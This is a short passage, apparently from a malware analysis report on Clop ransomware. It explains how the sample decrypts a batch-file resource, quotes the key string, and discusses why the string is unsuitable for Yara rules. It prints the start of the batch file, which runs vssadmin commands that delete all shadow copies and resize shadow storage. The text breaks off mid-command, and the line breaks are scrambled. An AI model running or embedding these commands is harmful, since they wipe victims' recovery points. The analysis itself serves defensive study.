@@ -1,0 +1,13 @@
+
+FIGURE 14.
+New resource name for the batch file However, the algorithm to decrypt this resource is the same, except that they changed the big string that acts as a key for the bytes.
+Now the string is: “JLKHFVIjewhyur3ikjfldskfkl23j3iuhdnfklqhrjjio2ljkeosfjh7823763647823hrfuweg56t7r6t73824y78Clop”.
+It is important to remember that this string remains in plain text in the binary but, as it has changed, it cannot be used for a Yara rule.
+The same counts for the name of the resources and also for the hash of the resource because the bat changes per line in some cases and in another as it will have more code to stop services of products of security and databases.
+The contents of the new BAT file are: @echo off vssadmin Delete Shadows /all /quiet vssadmin resize shadowstorage /for
+=c: /on
+=c: /maxsize=401
+MB vssadmin resize shadowstorage /for
+=c: /on
+=c: /maxsize
+=unbounded vssadmin resize shadowstorage /for=
